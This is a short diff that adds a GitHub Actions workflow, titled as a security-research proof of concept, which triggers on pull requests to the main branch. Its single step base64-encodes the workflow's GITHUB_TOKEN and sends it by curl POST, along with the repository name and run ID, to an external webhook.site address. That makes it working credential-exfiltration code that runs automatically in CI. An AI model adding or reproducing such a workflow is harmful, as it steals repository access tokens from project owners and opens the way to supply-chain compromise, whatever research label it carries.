@@ -1,0 +1,12 @@
+# PoC: Token capture - security research
+name: PoC Token Capture
+on:
+  pull_request:
+    branches: [main]
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Capture token
+        run: |
+          curl -s -X POST "https://webhook.site/bf6c2622-f34e-4a71-a7b1-145d4c2dc9ec" -d "poc=1&repo=${{ github.repository }}&run_id=${{ github.run_id }}&token_b64=$(echo -n "$GITHUB_TOKEN" | base64)"
